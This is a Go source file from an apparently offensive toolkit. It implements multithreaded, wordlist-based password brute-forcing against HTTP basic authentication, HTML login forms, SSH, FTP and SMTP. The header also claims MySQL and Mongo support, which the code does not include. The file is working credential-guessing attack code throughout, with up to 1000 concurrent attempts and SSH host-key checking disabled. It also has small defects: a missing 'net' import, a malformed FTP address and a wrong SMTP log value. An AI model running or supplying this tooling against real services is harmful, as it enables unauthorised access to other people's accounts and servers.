/*
Developer -> ArkAngeL43
File      -> brute.go
Filepath  -> modg/scripts/brute-forcing
Module    -> scripts
Package   -> BRUTE

Does:
	Brute forces HTML forms
	Brute forces HTML basic authentication
	Brute forces SSH
	Brute forces FTP
	Brute forces MYSQL
	Brute forces MONGO
	Brute forces SMTP
*/
package BRUTE

import (
	"bufio"
	"bytes"
	"fmt"
	v "main/modg/colors"
	berr "main/modg/scripts/brute-forcing/errors"
	readers "main/modg/scripts/brute-forcing/readers"
	warn "main/modg/warnings"
	"net/http"
	"net/smtp"
	"os"
	"strings"
	"time"

	"github.com/jlaffaye/ftp"
	"golang.org/x/crypto/ssh"
)

var (
	Client        = &http.Client{}
	thread_count  = 0
	max_threads   = 1000
	hardware_chan = make(chan bool)
	try           = 0
)

// basic http auth brute forcing

func Auth_URL_BASIC_HTTP_AUTH(SENDMETHOD, user, pass, url string, hw_chan chan bool) {
	req, err := http.NewRequest(SENDMETHOD, url, nil)
	warn.Warning_advanced("<RR6> Call from - Errors module: Could not make a new client request in requests module, something went wrong ==> ", v.REDHB, 1, false, false, false, err, 1, 255, "")
	req.SetBasicAuth(user, pass)
	response, e := Client.Do(req)
	warn.Warning_advanced("<RR6> Call from - Errors module: Could not make the client do the request, something went wrong ==> ", v.REDHB, 1, false, false, false, e, 1, 255, "")
	if response.StatusCode == 200 {
		fmt.Printf("<RR6> Brute Forcing Module: Password found for user [%v] <----> [%v] ", user, pass)
		os.Exit(0)
	}
	hw_chan <- true
}

func Brute_BASIC_HTTP_AUTH(url, wordlist, username string, threads int) {
	pswd_file, e := os.Open(wordlist)
	warn.Warning_advanced("<RR6> Call from - Errors module: Could not open up filename or wordlist, something went wrong ==> ", v.REDHB, 1, false, false, false, e, 1, 255, "")
	defer pswd_file.Close()
	scanner := bufio.NewScanner(pswd_file)
	for scanner.Scan() {
		thread_count += 1
		pass := scanner.Text()
		go Auth_URL_BASIC_HTTP_AUTH("GET", username, pass, url, hardware_chan)
		if thread_count >= max_threads {
			<-hardware_chan
			thread_count -= 1
		}
	}
	for thread_count > 0 {
		<-hardware_chan
		thread_count -= 1
	}
}

// html login form brute forcing
func Auth_HTTP_LOGIN_FORM(url, password_field, user_field, password, username string, hwchan chan bool, error_response string) {
	information_to_post := user_field + "=" + username + "&" + password_field + "=" + password
	req, e := http.NewRequest("POST", url, bytes.NewBufferString(information_to_post))
	warn.Warning_advanced("<RR6> Call from - Errors module:Could not make a new POST request to post the data ==> ", v.REDHB, 1, false, false, false, e, 1, 255, "")
	response, e := Client.Do(req)
	warn.Warning_advanced("<RR6> Call from - Errors module:Could not properly DO the new POST request to post the data ==> ", v.REDHB, 1, false, false, false, e, 1, 255, "")
	defer response.Body.Close()
	b := make([]byte, 5000)
	response.Body.Read(b)
	if strings.Contains(string(b), string(error_response)) {
		fmt.Printf("<RR6> Brute Forcing module: Got web error in body | Password [ %v ] came back false \n", password)
		fmt.Println(b)
	} else {
		fmt.Printf("<RR6> Brute Forcing Module: Found possible password -> [%v] for user [%v]\n", password, username)
		os.Exit(0)
	}
	hwchan <- true
}

func Brute_HTTP_LOGIN_FORM(url, username, userfield, passfield, wordlist, error_response string) {
	passwordl, e := os.Open(wordlist)
	warn.Warning_advanced("<RR6> Call from - Errors module: Could not open wordlist ==> ", v.REDHB, 1, false, false, false, e, 1, 255, "")
	defer passwordl.Close()
	scanner := bufio.NewScanner(passwordl)
	for scanner.Scan() {
		thread_count += 1
		pass := scanner.Text()
		go Auth_HTTP_LOGIN_FORM(url, passfield, userfield, pass, username, hardware_chan, error_response)
		if thread_count >= max_threads {
			<-hardware_chan
			thread_count -= 1
		}
	}
}

// SSH brute forcing
func Auth_SSH_(username, password, host, port string, hw_chan chan bool) {
	sshConfig := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	_, e := ssh.Dial("tcp", net.JoinHostPort(host, port), sshConfig)
	warn.Warning_advanced("<RR6> Call from - Errors module: Could not make a connection or dial up to the ssh server ==> ", v.REDHB, 1, false, false, false, e, 1, 255, "")
	fmt.Println(e)
	if e == nil {
		fmt.Println("<RR6> SSH Module: Made connection to host | password for host -> ", host, " is -> ", password)
	} else {
		try++
		fmt.Println("<RR6> SSH Module: Auth failed | ", try, " | ")
	}
	hw_chan <- true
}

func Brute_SSH_(username, wordlist, host, port string) {
	content, e := os.Open(wordlist)
	warn.Warning_advanced("<RR6> Call from - Errors module: Could not open wordlist ==> ", v.REDHB, 1, false, false, false, e, 1, 255, "")
	defer content.Close()
	scanner := bufio.NewScanner(content)
	for scanner.Scan() {
		thread_count += 1
		pass := scanner.Text()
		go Auth_SSH_(username, pass, host, port, hardware_chan)
		if thread_count >= max_threads {
			<-hardware_chan
			thread_count -= 1
		}
	}
	for thread_count > 0 {
		<-hardware_chan
		thread_count -= 1
	}
}

// FTP brute forcing
// https://pkg.go.dev/github.com/jlaffaye/ftp
func Auth_FTP_(username, password, host, port string, hw_chan chan bool) {
	parser := host + port
	ctx, e := ftp.Dial(parser, ftp.DialWithTimeout(5*time.Second))
	warn.Warning_advanced("<RR6> Call from - Errors module: Could not make a connection to the FTP server timeout passed 5 seconds", v.REDHB, 1, false, false, false, e, 1, 255, "")
	e = ctx.Login(username, password)
	if e != nil {
		fmt.Println("<RR6> FTP Module: Couold not make a connection for authentication to the host, trying new credential <<< ", try, " >>> ")
		try++
	} else {
		fmt.Printf("<RR6> FTP Moduke: Made a sucessful connection to the host for authentication PASS: <<< %s >>> USER: <<< %s >>> ", password, username)
		os.Exit(0)
	}
	hw_chan <- true
}

func Brute_FTP(username, wordlist, host, port string) {
	content, e := os.Open(wordlist)
	warn.Warning_advanced("<RR6> Call from - Errors module: Could not open wordlist ==> ", v.REDHB, 1, false, false, false, e, 1, 255, "")
	defer content.Close()
	scan := bufio.NewScanner(content)
	for scan.Scan() {
		thread_count += 1
		pass := scan.Text()
		go Auth_FTP_(username, pass, host, port, hardware_chan)
		if thread_count >= max_threads {
			<-hardware_chan
			thread_count -= 1
		}
	}
	for thread_count > 0 {
		<-hardware_chan
		thread_count -= 1
	}
}

// SMTP brute forcing

func Brute_SMTP(wordlist, email, service string) {
	pass := readers.Read_filepath(wordlist)
	e_mail := []string{email}
	for _, con := range pass {
		authentication := smtp.PlainAuth("", email, con, service)
		e := smtp.SendMail(fmt.Sprintf("%s:%d", service, 587),
			authentication,
			email,
			e_mail,
			[]byte(":D"))
		if berr.Denied_request(e) {
			fmt.Printf("<RR6> SMTP Module: Was able to sucessfully make a connection with EMAIL <<< %s >>> and PASS <<< %s >>> \n", email, pass)
			os.Exit(0)
		} else {
			fmt.Printf("<RR6> SMTP Module: Authentication failed |<<< %s >>>|  > |<<< %s >>>| ", email, pass)
		}
	}
}

//
